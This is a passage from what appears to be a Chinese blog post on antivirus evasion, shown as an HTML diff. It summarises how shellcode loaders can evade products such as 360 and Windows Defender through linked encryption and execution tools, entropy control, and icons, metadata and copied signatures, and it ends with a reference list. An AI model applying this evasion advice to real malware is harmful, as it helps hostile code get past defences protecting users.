+<p>有了对免杀理论的了解，配合 <a href="https://github.com/yutianqaq/Supernova_CN" target="_blank">https://github.com/yutianqaq/Supernova_CN</a> 与 <a href="https://github.com/xiecat/AlternativeShellcodeExec-Go" target="_blank">https://github.com/xiecat/AlternativeShellcodeExec-Go</a> 中的不同载入方式，就可以实现免杀（x60、wd等等一些常见的杀软）。<br/>
+在制作免杀加载器时候还需要注意熵值，通过合理的转换 Shellcode ，尽量将最终程序的熵值限制在合法范围内。使用 <a href="https://github.com/yutianqaq/EntropyCalc_Go" target="_blank">https://github.com/yutianqaq/EntropyCalc_Go</a> 可以观察各个节熵值变化（能控制的大头是 数据节和资源节）。可以添加图标、详细信息、自签名、复制签名等方式规避杀软。<br/>
+总之，规避杀软需要将程序行为合法（静态、动态、流量等方面）</p>
+<h1 data-content="1" id="e650beee2961d99ecb70351d78acb9ed">参考</h1>
+<p><a href="https://practicalsecurityanalytics.com/file-entropy/" target="_blank">https://practicalsecurityanalytics.com/file-entropy/</a><br/>
+<a href="https://github.com/nickvourd/Supernova" target="_blank">nickvourd/Supernova: Real fucking shellcode encryption tool</a><br/>
+<a href="https://github.com/xiecat/AlternativeShellcodeExec-Go" target="_blank">https://github.com/xiecat/AlternativeShellcodeExec-Go</a><br/>
+<a href="https://blog.csdn.net/xukun5137/article/details/93518683" target="_blank">https://blog.csdn.net/xukun5137/article/details/93518683</a></p>
+</div>
+</div>
